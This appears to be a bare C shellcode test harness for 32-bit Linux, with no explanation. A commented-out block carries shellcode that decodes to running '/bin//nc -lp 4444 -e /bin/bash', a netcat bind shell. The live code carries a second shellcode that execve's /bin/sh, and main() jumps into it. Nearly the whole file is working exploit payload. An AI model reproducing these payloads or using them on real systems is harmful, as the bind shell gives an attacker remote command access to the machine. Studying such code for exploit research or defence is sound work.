/*

char shellcode[]={"\x31\xc0\x50\x31\xdb\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x8d\x1c\x24\xb9\x34\x34\x2d\x6c\xc1\xe9\x10\x51\x8d\x0c\x24\xba\x34\x34\x2d\x70\xc1\xea\x10\x52\x8d\x14\x24\x50\x68\x34\x34\x34\x34\x8d\x3c\x24\xbe\x34\x34\x2d\x65\xc1\xee\x10\x56\x89\xe6\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x8d\x04\x24\x31\xed\x55\x50\x56\x57\x52\x51\x53\x8d\x0c\x24\x31\x2d\x31\xff\x31\xf6\x31\xc0\xb0\x0b\xcd\x80"};

int main(){
    void (*ptr) (void) = &shellcode;
    ptr();
    return 0;
}*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
